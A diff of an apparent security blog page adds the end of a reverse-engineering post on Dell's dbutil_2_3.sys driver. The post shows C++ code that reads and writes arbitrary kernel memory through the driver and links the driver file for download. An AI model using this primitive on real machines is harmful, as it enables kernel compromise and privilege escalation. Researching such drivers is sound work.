+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;0x%02X &#34;</span>, <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(bytes)[i]);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[])
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;Creating handle to the device driver dbutil_2_3.sys</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	DBUtilInterface dbutil_interface;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;handle %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dbutil_interface.device_handle);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src;
+</span></span><span style="display:flex;"><span>	scanf_s(<span style="color:#e6db74">&#34;%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>src);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, src);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> dst[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	dbutil_interface.read_kernel_memory(dst, src, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>	print_bytes(dst, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	dbutil_interface.write_kernel_memory(src, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#e6db74">&#34;hello</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	dbutil_interface.read_kernel_memory(dst, src, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>	print_bytes(dst, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<p>Now we can use this driver to write memory and read memory from any address in the kernel, just note for yourself that using them on and undefined memory or a memory with invalid protection will result in BSOD&hellip;</p>
+<p><a href="/windows/kernel/reverse_dbutil_2_3/files/dbutil_2_3.sys">dbutil_2_3.sys</a></p>
 
             
         </div>
@@ -1127,7 +1345,7 @@ We can decrypt with ECB mode the encrypted flag, and then using the IV we receiv
                 <li>
                     
                         Word Count:
-                        185
+                        541
                     
                 </li>
             
@@ -1163,7 +1381,7 @@ We can decrypt with ECB mode the encrypted flag, and then using the IV we receiv
                     
                         Last modified: &nbsp;
                         <time>
-                            Apr 26 2024 10:59:55
+                            Aug 07 2024 00:00:00
                         </time>
                     
                 </li>
